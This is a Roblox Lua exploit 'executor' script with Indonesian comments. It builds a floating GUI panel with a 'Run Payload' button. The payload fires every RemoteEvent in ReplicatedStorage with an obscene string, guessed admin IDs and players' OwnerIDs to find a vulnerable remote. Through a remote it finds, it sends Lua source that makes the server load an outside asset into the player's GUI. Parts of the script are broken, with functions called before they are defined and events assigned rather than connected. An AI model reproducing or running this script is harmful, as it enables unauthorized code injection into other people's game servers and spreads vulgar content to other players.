-- === Konfigurasi & Service ===
local GUI_NAME = "ExecutorGUI"
local ICON_ID = "rbxassetid://7335147596" 
local FLOATING_ICON_EMOJI = "🛡️"
local ICON_SIZE = UDim2.new(0, 50, 0, 50) 
local DRAG_THRESHOLD = 5 
local LOOP_INTERVAL = 0.5 
local SCAN_INTERVAL = 0.005 
local CONSOLE_PADDING = UDim.new(0, 5) 
local BUTTON_HEIGHT = 30 
local BUTTON_SPACING = 5  

-- Warna Modern/Minimalis
local COLOR_BG = Color3.fromRGB(35, 35, 35)      
local COLOR_ACCENT = Color3.fromRGB(0, 150, 255)  
local COLOR_ON = Color3.fromRGB(0, 200, 83)      
local COLOR_OFF = Color3.fromRGB(50, 50, 50)     
local COLOR_SCAN = Color3.fromRGB(255, 165, 0)   
local COLOR_WARN = Color3.fromRGB(255, 50, 50)   

-- Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local task = task

-- Variabel
local IS_GUI_VISIBLE = false

-- === 1. Fungsi Notifikasi ===
local function notify(title, text, duration, iconOverride)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 3,
        Icon = iconOverride or ICON_ID,
    })
end

-- === 7. Fungsi Drag GUI ===
local function makeDraggable(frame)
    local dragging = false
    local dragStartPos = nil
    local startFramePos = nil
    local isDragging = false 

    local dragArea = frame:FindFirstChild("DragHandle") or frame
    dragArea.Active = true

    dragArea.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            isDragging = false 
            dragStartPos = input.Position
            startFramePos = frame.Position
        end
    end)

    dragArea.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
            local delta = input.Position - dragStartPos
            if (delta.X * delta.X + delta.Y * delta.Y) > (DRAG_THRESHOLD * DRAG_THRESHOLD) then
                isDragging = true
            end
            if isDragging then
                frame.Position = UDim2.new(startFramePos.X.Scale, startFramePos.X.Offset + delta.X, startFramePos.Y.Scale, startFramePos.Y.Offset + delta.Y)
            end
        end
    end)
    
    dragArea.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    return function()
        return isDragging
    end
end

-- === 2. Pembuatan GUI utama dan sub-Frame ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = GUI_NAME
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.Parent = PlayerGui 

local total_buttons = 3 -- tombol utama + icon toggle + payload
local main_frame_height = 30 + (total_buttons * BUTTON_HEIGHT) + ((total_buttons - 1) * BUTTON_SPACING) + 15 

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 250, 0, main_frame_height) 
MainFrame.Position = UDim2.new(0.5, -125, 0.5, -(main_frame_height / 2)) 
MainFrame.BackgroundColor3 = COLOR_BG
MainFrame.BorderSizePixel = 0
MainFrame.Visible = false 
MainFrame.Parent = ScreenGui

local CornerMain = Instance.new("UICorner")
CornerMain.CornerRadius = UDim.new(0, 8) 
CornerMain.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "DragHandle" 
TitleLabel.Size = UDim2.new(1, 0, 0, 30)
TitleLabel.BackgroundColor3 = COLOR_ACCENT
TitleLabel.Text = "🛠️ PANEL (1 FITUR)"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.SourceSansSemibold
TitleLabel.TextSize = 18
TitleLabel.Active = true 
TitleLabel.Parent = MainFrame

local function getButtonY(index)
    return 30 + (BUTTON_SPACING * index) + (BUTTON_HEIGHT * (index - 1))
end

-- Tombol Utama 1 (toggle GUI)
local IconButton = Instance.new("TextButton") 
IconButton.Name = "IconButton"
IconButton.Size = UDim2.new(0.9, 0, 0, BUTTON_HEIGHT)
IconButton.Position = UDim2.new(0.05, 0, 0, getButtonY(1))
IconButton.BackgroundColor3 = COLOR_OFF
IconButton.Text = "🎭 ICON TOGGLE (Baru)"
IconButton.Parent = MainFrame

-- Tombol 2: Run Payload
local function runPayload()
    if isMainFrameDragging() then return end
    notify("🚀 Payload", "Menjalankan payload...", 3)
    local workspace = game:GetService("Workspace")
    local modelName = "sptzyy"
    local zyy = nil
    local lastFired = nil

    -- Hapus objek dengan nama modelName dari workspace
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj.Name == modelName then
            obj:Destroy()
        end
    end

    -- Deteksi saat objek modelName ditambahkan
    workspace.ChildAdded:Connect(function(child)
        if child.Name == modelName and zyy == nil then
            zyy = lastFired
            print("Found zyy!")
        end
    end)

    local payload = "KONTOL MESUM😂"

    -- Kirim payload ke RemoteEvent
    for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(payload)
            end)
            lastFired = remote
            game:GetService("RunService").RenderStepped:Wait()
        end
    end

    task.wait(0.5)

    -- Kirim payload admin ID
    local adminPayloads = {12345, 67890, 13579}
    for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            for _, payloadID in ipairs(adminPayloads) do
                pcall(function()
                    remote:FireServer(payloadID)
                end)
            end
            lastFired = remote
            game:GetService("RunService").RenderStepped:Wait()
        end
    end

    -- Kumpulkan OwnerID
    local ownerIDList = {}
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj:FindFirstChild("OwnerID") then
            local ownerID = obj.OwnerID.Value
            if not table.find(ownerIDList, ownerID) then
                table.insert(ownerIDList, ownerID)
            end
        end
    end

    -- Kirim ke semua OwnerID
    for _, ownerID in ipairs(ownerIDList) do
        for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer(ownerID)
                end)
                lastFired = remote
                game:GetService("RunService").RenderStepped:Wait()
            end
        end
    end

    -- Kirim payload ke zyy jika ketemu
    if zyy and typeof(zyy) == "Instance" then
        local playerName = game.Players.LocalPlayer.Name
        local insertPayload = [[
            local player = game.Players:FindFirstChild("]] .. playerName .. [[")
            if player and player:FindFirstChild("PlayerGui") then
                local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
                asset.Parent = player.PlayerGui
                for _, child in ipairs(asset:GetChildren()) do
                    child.Parent = player.PlayerGui
                end
                asset:Destroy()
            end
        ]]
        zyy:FireServer(insertPayload)
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "sptzyy",
            Text = ":(",
            Icon = "",
            Duration = 5,
        })
    end
end

local PayloadButton = Instance.new("TextButton")
PayloadButton.Name = "PayloadButton"
PayloadButton.Size = UDim2.new(0.9, 0, 0, BUTTON_HEIGHT)
PayloadButton.Position = UDim2.new(0.05, 0, 0, getButtonY(2))
PayloadButton.BackgroundColor3 = COLOR_OFF
PayloadButton.Text = "🚀 Run Payload"
PayloadButton.Parent = MainFrame

PayloadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
PayloadButton.Font = Enum.Font.SourceSansBold
local CornerPayload = Instance.new("UICorner")
CornerPayload.CornerRadius = UDim.new(0, 6)
CornerPayload.Parent = PayloadButton
PayloadButton.MouseButton1Click = runPayload

-- Tombol 3: Icon toggle (placeholder)
local function toggleIcon()
    if isMainFrameDragging() then return end
    notify("🎭 Icon Toggle", "Fitur icon toggle belum diimplementasikan.", 2)
end
local IconToggleButton = Instance.new("TextButton")
IconToggleButton.Name = "IconToggleButton"
IconToggleButton.Size = UDim2.new(0.9, 0, 0, BUTTON_HEIGHT)
IconToggleButton.Position = UDim2.new(0.05, 0, 0, getButtonY(3))
IconToggleButton.BackgroundColor3 = COLOR_OFF
IconToggleButton.Text = "🎭 ICON TOGGLE (Baru)"
IconToggleButton.Parent = MainFrame

IconToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
IconToggleButton.Font = Enum.Font.SourceSansBold
local CornerIconToggle = Instance.new("UICorner")
CornerIconToggle.CornerRadius = UDim.new(0, 6)
CornerIconToggle.Parent = IconToggleButton
IconToggleButton.MouseButton1Click = toggleIcon

-- Style semua tombol
for _, btn in ipairs(MainFrame:GetChildren()) do
    if btn:IsA("TextButton") then
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.SourceSansBold
        local Corner = Instance.new("UICorner")
        Corner.CornerRadius = UDim.new(0, 6)
        Corner.Parent = btn
    end
end

-- === 8. Support drag GUI
local function isMainFrameDragging()
    -- placeholder, nanti update jika perlu
    return false
end

-- === 3. Icon floating dan toggle
local FloatingIcon = Instance.new("TextButton") 
FloatingIcon.Name = "AudioToggleIcon"
FloatingIcon.Size = ICON_SIZE
FloatingIcon.Position = UDim2.new(0.02, 0, 0.85, 0) 
FloatingIcon.BackgroundTransparency = 0.1 
FloatingIcon.BackgroundColor3 = COLOR_ACCENT 
FloatingIcon.Text = FLOATING_ICON_EMOJI 
FloatingIcon.Parent = ScreenGui 

local CornerIcon = Instance.new("UICorner")
CornerIcon.CornerRadius = UDim.new(0.5, 0) 
CornerIcon.Parent = FloatingIcon

local isIconDragging = makeDraggable(FloatingIcon)

FloatingIcon.MouseButton1Click = function()
    if not isIconDragging() then
        IS_GUI_VISIBLE = not IS_GUI_VISIBLE
        MainFrame.Visible = IS_GUI_VISIBLE 
        
        if not IS_GUI_VISIBLE then
            -- jika ingin menutup
        end

        notify("⚙️ GUI Status", "Panel Eksekutor: " .. (IS_GUI_VISIBLE and "Terlihat" or "Tersembunyi"), 2)
    end
end

-- === 4. Finalisasi & Notifikasi
notify("✅ Executor Loaded", "Floating Icon " .. FLOATING_ICON_EMOJI .. " aktif. Klik untuk buka panel.", 4)